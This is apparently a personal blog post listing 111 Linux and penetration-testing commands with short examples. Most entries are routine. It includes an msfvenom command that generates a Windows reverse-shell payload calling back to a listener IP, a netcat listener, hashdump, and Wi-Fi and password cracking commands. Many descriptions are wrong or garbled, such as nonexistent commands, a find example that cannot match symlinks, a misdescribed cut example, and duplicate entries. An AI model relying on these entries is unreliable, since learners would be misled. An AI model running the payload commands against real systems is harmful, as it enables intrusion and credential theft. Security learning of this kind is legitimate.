

1. `curl`: Command-line tool to transfer data with URLs. Example: `curl https://www.example.com` (downloads the content of example.com)

2. `strace file`: Trace system calls and signals. Example: `strace ls` (traces system calls made by the 'ls' command)

3. `base64`: Encode/decode binary files to/from base64. Example: `base64 image.jpg` (encodes an image file into base64)

4. `htop`: Interactive process viewer

5. `uniq`: Display unique lines from a sorted file. Example: `sort file.txt | uniq` (removes duplicate lines from a sorted text file)

6. `rot13`: Rotate characters by 13 positions. Example: `echo "Hello" | tr 'A-Za-z' 'N-ZA-Mn-za-m'` (applies ROT13 encryption to the text)

7.  `fish`: A shell. Must try

8. `gzip`: Compress or decompress files. Example: `gzip file.txt` (compresses the 'file.txt' and creates 'file.txt.gz')

9. `netsparker`: Web application security scanner. Example: `netsparker scan https://www.example.com` (scans a website for vulnerabilities)

10. `intruder`: Automates customized attacks. Example: `intruder -target https://www.example.com -payloads payloads.txt` (automates attacks with custom payloads)

11. `traceroute`: Discover the path packets take across an IP network. Example: `traceroute www.google.com` (displays the route taken by packets to reach Google's servers)

12. `burpsuit`: Web vulnerability scanner and proxy tool. Example: `burpsuite` (opens the Burp Suite graphical interface)

13. `ipconfig`: config a network interface.

14. `aircrack`: Wi-Fi network security tool. Example: `aircrack-ng capture.cap` (cracks WEP or WPA keys from a Wi-Fi capture file)

15. `hashcat`: Password recovery tool. Example: `hashcat -m 0 hash.txt wordlist.txt` (attempts to crack a hash using a wordlist)

16. `netstumbler`: Wireless network discovery tool. Example: `netstumbler` (scans for nearby wireless networks)

17. `SQLmap`: Detect and exploit SQL injection vulnerabilities. Example: `sqlmap -u "https://www.example.com/index.php?id=1"` (explores SQL injection on a website)

18. `dig`: DNS lookup utility. Example: `dig www.example.com` (performs a DNS lookup for example.com)

19. `wall`: Send messages to all users' terminals. Example: `echo "Emergency meeting at 2 PM!" | wall` (sends a message to all users)

20. `w`: Show who is logged on and what they're doing. Example: `w` (displays information about currently logged-in users)

21. `mkpasswd`: Generate passwords. Example: `mkpasswd -m sha-512` (generates a SHA-512 hashed password)

22. `lsof`: List ipen files.

23. `df`: report file system space. eg `df -h`

24. `free`: Display amount of free and used memeoty in system. eg `free -h`

25. `dpkg -i`: Install a Debian package. Example: `dpkg -i package.deb` (installs a Debian package)

26. `whatweb`: Web scanner. Example: `whatweb www.example.com` (scans a website and gathers information)

27. `searchsploit`: Search for exploits in Exploit Database. Example: `searchsploit wordpress` (searches for exploits related to WordPress)

28. `ip a`: Show IP addresses of network interfaces. Example: `ip a` (displays IP addresses and network interfaces)

29. `arp -a`: Display or modify the IP-to-Physical address translation tables. Example: `arp -a` (displays the ARP table)

30. `route`: Show or manipulate IP routing table. Example: `route -n` (displays the IP routing table)

31. `nikto`: Web server scanner. Example: `nikto -h www.example.com` (scans a web server for vulnerabilities)

32. `nss`: Name Service Switch configuration file. Example: `cat /etc/nsswitch.conf` (displays the NSS configuration)

33. `vega`: Web security scanner and testing platform. Example: `vega` (opens the Vega graphical interface)

34. `utf`: program for managing a netfilter firewall.

35. `rsync`: a fast, versatile, remote (and local) file-copying tool.

36. `directives`: Configuration settings for various applications. Example: `nginx -t` (checks the syntax of Nginx configuration)

37. `msf console`: Metasploit Framework console. Example: `msfconsole` (opens the Metasploit Framework console)

38. `msf venom`: Metasploit payload generator. Example: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > payload.exe` (generates a Windows reverse shell payload)

39. `subclient`: ftp-like client to access SMB/CIFS resources on servers.

40. `ping`: Send ICMP echo requests to network hosts. Example: `ping www.google.com` (sends ICMP requests to Google)

41. `traceroute`: Determine the route taken by packets. Example: `traceroute www.example.com` (displays the route taken by packets to reach example.com)

42. `whois`: Lookup domain registration information. Example: `whois example.com` (retrieves WHOIS information for example.com)

43. `ip route show`: Display routing table. Example: `ip route show` (displays the IP routing table)

44. `ip addr`: Show IP address settings for network interfaces. Example: `ip addr show eth0` (displays IP address settings for the 'eth0' interface)

45. `service network manager`: Manage network services. Example: `service NetworkManager restart` (restarts the NetworkManager service)

46. `netstat`: Network statistics. Example: `netstat -tuln` (displays active TCP and UDP network connections)

47. `FTP - 21`: File Transfer Protocol. Example: `ftp ftp.example.com` (connects to an FTP server)

48. `SSH - 22`: Secure Shell. Example: `ssh user@host` (connects to a remote host using SSH)

49. `SMB - 139, 445`: Server Message Block protocol. Example: `smbclient -L //host` (lists shares on an SMB server)

50. `HTTP/S - 80, 443`: Hypertext Transfer Protocol/Secure. Example: `curl http://www.example.com` (downloads content from example.com)

51. `less`: Display file contents. Example: `less file.txt` (displays the content of a file)

52. `route -m`: Display current routing table. Example: `route -m` (displays the IP routing table)

53. `whatis`: display one-line manual page descriptions. eg `whatis ls`

54. `whereis`: locate the binary, source, and manual page files for a command. eg `whereis ls`

55. `wc -l`: Count lines in a file. Example: `wc -l file.txt` (counts the number of lines in 'file.txt')

56. `sort -u`: Sort and remove duplicates from text files. Example: `sort -u file.txt` (sorts and removes duplicate lines from 'file.txt')

57. `cron`: Schedule tasks at specific times. Example: `crontab -e` (edit the user's crontab file)

58. `setuid`: Set user or group ID on execution. Example: `chmod u+s file` (sets the SUID permission on 'file')

59. `searchsploit`: Exploit Database Archive Search. eg `searchsploit ssh`

60. `netdiscover`: active/passive ARP reconnaissance tool.

61. `curl`: Command-line tool to transfer data with URLs. Example: `curl https://www.example.com` (downloads the content of example.com)

62. `wget`: Command-line utility to download files. Example: `wget https://www.example.com/file.txt` (downloads 'file.txt' from example.com)

63. `binwalk`: Firmware analysis tool. Example: `binwalk firmware.img` (analyzes a firmware image)

64. `zip2john`: Convert zip file to John the Ripper format. Example: `zip2john archive.zip > hash.txt` (converts 'archive.zip' to John format)

65. `arp`: Display or modify the IP-to-Physical address translation tables. Example: `arp -a` (displays the ARP table)

66. `sudo -l`: List user's privileges. Example: `sudo -l` (lists user's sudo privileges)

67. `top`: Monitor system activity. Example: `top` (displays real-time system activity)

68. `hashdump`: Dump password hashes. Example: `hashdump` (dumps password hashes from a system)

69. `nc - vnlp port`: Netcat listener on a port. Example: `nc -vnlp 4444` (starts a Netcat listener on port 4444)

70. `nc ip port`: Netcat connection to an IP and port. Example: `nc 192.168.1.2 80` (opens a Netcat connection to IP 192.168.1.2 on port 80)

71. `proxychains`: redirect connections through proxy servers.

72. `uid`: User ID. Example: `uid` (displays user's ID)

73. `macchanger`: Change MAC address. Example: `macchanger -r eth0` (randomly changes MAC address of 'eth0')

74. `ss`: Socket statistics. Example: `ss -tuln` (displays TCP and UDP socket statistics)

75. `netstat -r`: Display routing table. Example: `netstat -r` (displays the IP routing table)

76. `netstat -t`: Display TCP connections. Example: `netstat -t` (displays active TCP connections)

77. `netstat -l -list`: Display listening sockets. Example: `netstat -l -list` (displays listening sockets)

78. `netdiscober -i eth0`: Scan eth0 connections.

79. `dns`: Domain Name System. Example: `nslookup www.example.com` (performs DNS lookup for example.com)

80. `htop`: Interactive process viewer. Example: `htop` (displays interactive system processes)

81. `systemctl`: Control the systemd system and service manager. Example: `systemctl start service-name` (starts a systemd service)

82. `ssl`: Secure Sockets Layer. 

83. `tar -xf`: Extract files from a tar archive. Example: `tar -xf archive.tar.gz` (extracts 'archive.tar.gz')

84. `bzip2`: File compression tool. Example: `bzip2 file.txt` (compresses 'file.txt' and creates 'file.txt.bz2')

85. `nessus`: Vulnerability scanner. Example: `nessus` (starts the Nessus vulnerability scanner)

86. `cut`: Remove sections from lines of files. Example: `cut -d',' -f1 file.csv` (removes first field from CSV file)

87. `rand`: Generate random numbers. 

88. `ettercap`: multipurpose sniffer/content filter for man in the middle attacks.

89. `netsparker`: Web application security scanner. Example: `netsparker scan https://www.example.com` (scans a website for vulnerabilities)

90. `acunetis`: Web vulnerability scanner. 

91. `metasploit`: Penetration testing framework. Example: `msfconsole` (opens the Metasploit console)

92. `aircrack -ng`: Wi-Fi network security tool. Example: `aircrack-ng capture.cap` (cracks WEP/WPA keys from a Wi-Fi capture file)

93. `strings`: Display printable characters from files. Example: `strings binary.exe` (displays printable strings from 'binary.exe')

94. `lspci`: List all pci devices.

95. `ps -aux`: All running processes.

96. `free`: Display memory usage. Example: `free -h` (displays memory usage in human-readable format)

97. `iftop`: Real-time console-based network bandwidth monitoring tool. Example: `iftop -i eth0` (monitors bandwidth on 'eth0')

98. `umask`: Set file permissions. Example: `umask 0022` (sets default file permissions)

99. `hunter.io`: An email hunter tool that helps marketers find the contact information associated with any domain.

100. `crt.sh`: Certificate Search.

101. `sublist3r`: Subdomain enumeration tool. Example: `sublist3r -d example.com` (enumerates subdomains of example.com)

102. `builtwith`: Web technology profiler. Example: `builtwith https://www.example.com` (profiles technologies used by a website)

103. `locate`: Search files using a pre-built database. Example: `locate file.txt` (searches for 'file.txt' in the database)

104. `grep`: Search text for patterns. Example: `grep pattern file.txt` (searches for 'pattern' in 'file.txt')

105. `|`: Pipe operator. Example: `ls -l | grep ".txt"` (pipes 'ls -l' output to 'grep' to filter .txt files)

106. `group`: User group management. Example: `groupadd mygroup` (creates a new user group 'mygroup')

107. `lscpu`: display information about the CPU architecture.

108. `find`: Search for files and directories. Example: `find /path/to/search -name "*.txt"` (finds all .txt files)

109. `find -type f -lname "fileName"`: Searches for symbolic links with the specified target filename. Example: `find /path/to/search -type f -lname "target.txt"` (finds symbolic links to 'target.txt')

110. `ltrace`: A library call tracker. eg `ltrace ls`
111. `locate`: Find files by name, quickly

**All these commands are from the notes that accumulate as `tooks to check`, and I thought I must share them with everyone.** I took help from Google, Whatis Command, and ChatGPT. If you have anymore suggestions do comment.

---
If you have interest in **open source** you can contribue to my projects 
1. [One Liner](https://github.com/asPerReqirements/oneliner)
2. [Click Counter](https://github.com/asPerReqirements/click-counter)
---
If the article helps you, leave a like, follow, or anything 🙂.  
You can follow me on [LinkedIn](https://www.linkedin.com/in/abhishekpathak32/), [GitHub](https://github.com/scorcism), [Dev.to](https://dev.to/scorcism) and [hashnode](https://scorcism.hashnode.dev/).

**Bye**
